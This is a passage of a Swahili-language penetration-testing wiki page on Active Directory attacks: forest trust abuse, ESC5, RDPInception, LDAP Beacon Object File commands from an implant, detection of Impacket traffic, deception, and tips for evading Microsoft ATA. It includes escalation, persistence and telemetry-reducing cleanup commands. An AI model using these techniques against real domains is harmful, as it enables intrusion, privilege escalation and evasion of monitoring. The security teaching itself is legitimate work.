Vulnerability ya ADCS ESC5 inalenga udhibiti wa Public Key Infrastructure (PKI) objects ili kuunda certificate template inayowezesha authentication kama mtumiaji yeyote ndani ya forest. Kwa kuwa PKI objects ziko ndani ya Configuration NC, kuhatarisha child DC inayoweza kuandikwa huwezesha kutekeleza mashambulizi ya ESC5.

Maelezo zaidi kuhusu hili yanapatikana kwenye [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Katika hali ambapo ADCS haipo, mshambuliaji anaweza kusanidi vipengele vinavyohitajika, kama ilivyojadiliwa kwenye [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) au bidirectional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Katika hali hii **domain yako inaaminiwa** na domain ya nje, na hivyo kukupa **ruhusa ambazo hazijabainishwa** juu yake. Utahitaji kubaini **ni principals gani za domain yako zina ufikiaji gani kwenye domain ya nje**, kisha ujaribu kuitumia vibaya:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain ya Forest ya Nje - Njia Moja (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Katika hali hii, **domain yako** inaamini baadhi ya **privileges** kwa principal kutoka **domains** nyingine.

Hata hivyo, **domain inapoaminiwa** na domain inayoamini, domain inayoaminiwa **huunda user** mwenye **jina linaloweza kutabirika** na kutumia **trusted password** kama **nenosiri**. Hii inamaanisha kuwa inawezekana **kutumia user kutoka domain inayoamini ili kuingia kwenye domain inayoaminiwa**, kuichunguza na kujaribu kupandisha privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuhatarisha domain inayoaminiwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa **upande tofauti** wa trust ya domain (jambo ambalo si la kawaida sana).

Njia nyingine ya kuhatarisha domain inayoaminiwa ni kusubiri kwenye mashine ambayo **user kutoka domain inayoaminiwa anaweza kuifikia** ili aingie kwa kutumia **RDP**. Kisha, mshambuliaji anaweza kuingiza code kwenye process ya session ya RDP na **kufikia domain asili ya victim** kutoka hapo.\
Zaidi ya hayo, ikiwa **victim alikuwa ame-mount hard drive yake**, mshambuliaji anaweza kutumia process ya session ya **RDP** kuhifadhi **backdoors** kwenye **startup folder ya hard drive**. Mbinu hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupunguza hatari ya matumizi mabaya ya trust za domain

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia attribute ya SID history katika trust za forest-to-forest hupunguzwa na SID Filtering, ambayo huwashwa kwa chaguo-msingi kwenye trust zote za inter-forest. Hii inategemea dhana kwamba trust za intra-forest ni salama, huku forest, badala ya domain, ikichukuliwa kuwa mpaka wa usalama kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna changamoto: SID filtering inaweza kuvuruga applications na ufikiaji wa user, hivyo wakati mwingine huzimwa.

### **Selective Authentication:**

- Kwa trust za inter-forest, kutumia Selective Authentication huhakikisha kwamba users kutoka forest hizo mbili hawathibitishwi kiotomatiki. Badala yake, ruhusa za wazi zinahitajika ili users waweze kufikia domains na servers ndani ya domain au forest inayoamini.
- Ni muhimu kutambua kwamba hatua hizi hazilindi dhidi ya matumizi mabaya ya Writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**Maelezo zaidi kuhusu trust za domain kwenye ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Matumizi Mabaya ya AD kupitia LDAP kutoka kwa On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) hutekeleza upya primitives za LDAP za mtindo wa bloodyAD kama Beacon Object Files za x64 zinazoendeshwa kabisa ndani ya implant iliyo kwenye host (kwa mfano, Adaptix C2). Operators hukompile kifurushi kwa kutumia `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, hupakia `ldap.axs`, kisha huita `ldap <subcommand>` kutoka kwenye beacon. Trafiki yote hutumia muktadha wa usalama wa logon ya sasa kupitia LDAP (389) yenye signing/sealing au LDAPS (636) yenye auto certificate trust, kwa hiyo hakuna haja ya socks proxies au artifacts kwenye diski.<sup>[[4]](#references)</sup>

### Enumeration ya LDAP upande wa implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, na `get-groupmembers` hubadilisha majina mafupi/njia za OU kuwa DNs kamili na kutoa taarifa za objects husika.
- `get-object`, `get-attribute`, na `get-domaininfo` huchukua attributes zozote (ikiwemo security descriptors) pamoja na metadata ya forest/domain kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, na `get-rbcd` huonyesha wagombea wa roasting, mipangilio ya delegation, na descriptors zilizopo za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) moja kwa moja kutoka LDAP.
- `get-acl` na `get-writable --detailed` huchanganua DACL ili kuorodhesha trustees, haki (GenericAll/WriteDACL/WriteOwner/attribute writes), na urithishaji, hivyo kutoa mara moja malengo ya kupandisha privileges kupitia ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP write primitives za escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) humwezesha operator kuandaa principals au machine accounts mpya katika OU zozote ambako kuna ruhusa za kuandika. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huteka moja kwa moja targets mara tu haki za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye object yoyote ya AD kuwa uwezo wa kuweka upya password, kudhibiti uanachama wa group, au kupata ruhusa za replication za DCSync bila kuacha mabaki ya PowerShell/ADSI. Amri zinazolingana za `remove-*` husafisha ACE zilizoongezwa.

### Delegation, roasting, na matumizi mabaya ya Kerberos

- `add-spn`/`set-spn` humfanya mara moja user aliyeathiriwa aweze kushambuliwa kwa Kerberoast; `add-asreproastable` (UAC toggle) humwekea alama ya kushambuliwa kwa AS-REP roasting bila kugusa password.
- Macros za delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) huandika upya `msDS-AllowedToDelegateTo`, UAC flags, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, na hivyo kuwezesha njia za mashambulizi za constrained/unconstrained/RBCD na kuondoa hitaji la PowerShell ya mbali au RSAT.

### Uingizaji wa sidHistory, uhamishaji wa OU, na uundaji wa attack surface

- `add-sidhistory` huingiza SIDs zenye privileged kwenye SID history ya principal inayodhibitiwa (tazama [SID-History Injection](sid-history-injection.md)), na kutoa urithi wa ufikiaji kwa njia fiche kupitia LDAP/LDAPS pekee.
- `move-object` hubadilisha DN/OU ya computers au users, na kumwezesha mshambuliaji kuhamisha assets chini ya delegated rights kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`. Tazama [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) kuhusu ruhusa za kuhamisha na ukaguzi wa inheritance.
- Amri za kuondoa zenye upeo maalum (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huwezesha kurejesha hali ya awali haraka baada ya operator kuvuna credentials au kupata persistence, na kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Baadhi ya Njia za Jumla za Ulinzi

[**Jifunze zaidi kuhusu jinsi ya kulinda credentials hapa.**](../stealing-credentials/credentials-protections.md)

### **Hatua za Kinga ya Credentials**

- **Vizuizi kwa Domain Admins**: Inapendekezwa kuwa Domain Admins waruhusiwe kuingia kwenye Domain Controllers pekee, na wasitumike kwenye hosts nyingine.
- **Ruhusa za Service Account**: Services hazipaswi kuendeshwa kwa ruhusa za Domain Admin (DA) ili kudumisha usalama.
- **Kuweka Kikomo cha Muda kwa Privilege**: Kwa kazi zinazohitaji ruhusa za DA, muda wake unapaswa kuwa na kikomo. Hili linaweza kufanywa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Kupunguza hatari ya LDAP relay**: Kagua Event IDs 2889/3074/3075, kisha weka lazima LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia majaribio ya LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Utambuzi wa alama za shughuli za Impacket katika kiwango cha protocol

Ikiwa unataka kugundua mbinu za kawaida za AD, **usitegemee tu mabaki yanayodhibitiwa na operator** kama binaries zilizopewa majina mapya, majina ya service, batch files za muda, au njia za output. Weka baseline ya jinsi clients halali za Windows zinavyounda traffic ya [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, na WMI, kisha tafuta **sifa za kipekee za utekelezaji** ambazo hubaki hata baada ya operator kuhariri `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, au `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Viashiria vya kujitegemea vyenye uhakika mkubwa** (baada ya kuvihakiki dhidi ya baseline yako):
  - DCE/RPC iliyothibitishwa kwa kutumia `auth_context_id = 79231 + ctx_id`
  - Padding ya uthibitishaji wa DCE/RPC iliyojazwa `0xff`
  - LDAP Kerberos binds zinazoweka Kerberos `AP-REQ` ghafi moja kwa moja kwenye SPNEGO `mechToken`
  - SMB2/3 negotiate requests zenye thamani za `ClientGuid` zinazoonekana kuwa ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` inayotumia namespace isiyo ya kawaida `//./root/cimv2`
  - Thamani za Kerberos nonce zilizowekwa moja kwa moja
- **Ni bora zaidi zitumike kama vipengele vya correlation/scoring**:
  - Orodha za Kerberos etype chache au zilizorudiwa, `PA-DATA` isiyo ya kawaida/inayokosekana, au mpangilio wa TGS-REQ etype unaotofautiana na Windows asilia
  - Ujumbe wa NTLM Type 1 usio na taarifa za version au ujumbe wa Type 3 wenye majina ya host yasiyo na thamani
  - NTLMSSP ghafi inayobebwa ndani ya DCE/RPC badala ya SPNEGO, DCE/RPC verification trailers zinazokosekana, au kutolingana kwa SPNEGO/Kerberos OID
  - Sifa kadhaa kati ya hizi kutoka kwa host/user/session/muda uleule zina nguvu zaidi sana kuliko field moja dhaifu
- **Zitumie kama taarifa za ziada, si alerts zinazojitegemea**:
  - Majina ya faili chaguomsingi, njia za output, majina nasibu ya service, majina ya batch ya muda, majina chaguomsingi ya computer account, na strings maalum za HTTP/WebDAV/RDP/MSSQL za tool
  - Operator anaweza kuzibadilisha kwa urahisi, kwa hiyo zinafaa zaidi kueleza kwa nini kundi la matukio katika protocols mbalimbali linatia shaka
- **Maelezo ya kiutendaji**:
  - Baadhi ya viashiria hivi vinahitaji traffic iliyodecryptiwa, [uchanganuzi wa PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, au mwonekano wa upande wa service
  - Vihakiki dhidi ya clients za Samba/Linux, vifaa maalum, na software za zamani kabla ya kuvipandisha kuwa alerts
  - Pandisha detections kutoka enrichment -> hunting -> alerting kadri unavyozidi kuamini baseline

### **Utekelezaji wa Mbinu za Udanganyifu**

- Utekelezaji wa udanganyifu unahusisha kuweka mitego, kama users au computers bandia, zenye sifa kama password zisizoisha muda au kuwekwa alama ya Trusted for Delegation. Mbinu ya kina inajumuisha kuunda users wenye ruhusa maalum au kuwaongeza kwenye groups zenye privilege kubwa.<sup>[[2]](#references)</sup>
- Mfano wa vitendo ni kutumia tools kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maelezo zaidi kuhusu kutumia mbinu za udanganyifu yanapatikana kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Kutambua Udanganyifu**

- **Kwa User Objects**: Viashiria vinavyotia shaka ni pamoja na ObjectSID isiyo ya kawaida, kuingia mara chache, tarehe za kuundwa, na idadi ndogo ya password zisizo sahihi.
- **Viashiria vya Jumla**: Kulinganisha attributes za objects zinazoweza kuwa decoy na zile za objects halisi kunaweza kufichua kutolingana. Tools kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua udanganyifu huo.

### **Kukwepa Mifumo ya Utambuzi**

- **Kukwepa Utambuzi wa Microsoft ATA**:
  - **User Enumeration**: Epuka kufanya session enumeration kwenye Domain Controllers ili kuzuia kugunduliwa na ATA.
  - **Ticket Impersonation**: Kutumia keys za **aes** kuunda tickets husaidia kukwepa utambuzi kwa kutoshusha kiwango hadi NTLM.
  - **Mashambulizi ya DCSync**: Inashauriwa kutekeleza kutoka kwa kifaa kisicho Domain Controller ili kuepuka kugunduliwa na ATA, kwa kuwa utekelezaji wa moja kwa moja kutoka kwa Domain Controller utasababisha alerts.

## References

- [1] [Mwongozo wa Kushambulia Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Kughushi Trusts kwa Udanganyifu katika Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Kutoka Domain Admin hadi Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – LDAP Toolkit ya In-Memory kwa Unyonyaji wa Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Kutumia NTLM Hashes kama Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Maharamia](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Kuchambua Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Kuteka Akaunti za Active Directory kupitia Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jinsi ya kudhibiti mabadiliko katika miunganisho salama ya channel ya Netlogon yanayohusiana na CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Safari katika Null Session na interfaces za MS-RPC zilizosahaulika](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kama mpaka wa usalama kati ya domains? (Sehemu ya 4) - Utafiti wa kukwepa SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kama mpaka wa usalama kati ya domains? (Sehemu ya 5) - Mashambulizi ya Golden GMSA trust - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kama mpaka wa usalama kati ya domains? (Sehemu ya 6) - Mashambulizi ya Schema change trust - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Kutoka DA hadi EA kwa ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Kupanda kutoka kwa admins wa child domain hadi enterprise admins kwa dakika 5 kwa kutumia vibaya AD CS, mwendelezo](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE Iliyofichwa: Kubuni DACL Backdoors za Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Chanzo cha NetExec pre2k module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - attribute ya msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
